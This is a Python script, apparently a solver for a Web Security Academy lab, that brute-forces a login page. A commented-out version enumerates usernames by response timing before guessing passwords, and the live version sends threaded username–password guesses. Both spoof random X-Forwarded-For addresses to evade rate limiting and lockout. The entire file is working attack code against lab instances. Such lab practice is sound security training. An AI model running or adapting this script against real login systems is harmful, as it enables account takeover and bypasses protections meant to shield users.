# import requests
# import random

# from tqdm import tqdm

# with open('usernames.txt', 'r') as r:
#     usernames = r.read().split('\n')

# with open('passwords.txt', 'r') as r:
#     passwords = r.read().split('\n')

# url = 'https://0a62005904a7d66b802d17370049008b.web-security-academy.net/login'

# data = {
#     'username':'testuser',
#     'password':'testpass'
# }

# # headers = {
# #     'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
# # }

# valid_user = []

# with requests.session() as s:
#     for username in tqdm(usernames):
#         headers = {
#             'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
#         }
#         data['username'] = username
#         r = s.post(url=url, data=data, headers=headers)
#         # if 'You have made too many incorrect login attempts. Please try again in 30 minute(s).' in r.text:
#         #     print("NAH")
#         if r.elapsed.total_seconds()>1.1:
#             for password in tqdm(passwords):
#                 data['password'] = password
#                 headers['X-Forwarded-For'] = f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
#                 r = s.post(url=url, data=data, headers=headers)
#                 if 'Invalid username or password.' not in r.text:
#                     print(f'{username=} : {password=}')
#                     break

import requests
import random
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

def check_credentials(username, password, url):
    data = {'username': username, 'password': password}
    headers = {'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}
    with requests.session() as s:
        r = s.post(url=url, data=data, headers=headers)
        if 'Invalid username or password.' not in r.text:
            print(f'{username=} : {password=}')
            return

if __name__ == "__main__":
    url = 'https://0ad400760439432a88236abf004500b0.web-security-academy.net/login'
    with open('usernames.txt', 'r') as f:
        usernames = f.read().split('\n')
    with open('passwords.txt', 'r') as f:
        passwords = f.read().split('\n')

    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers according to your system capabilities
        for username in tqdm(usernames):
            for password in passwords:
                executor.submit(check_credentials, username, password, url)
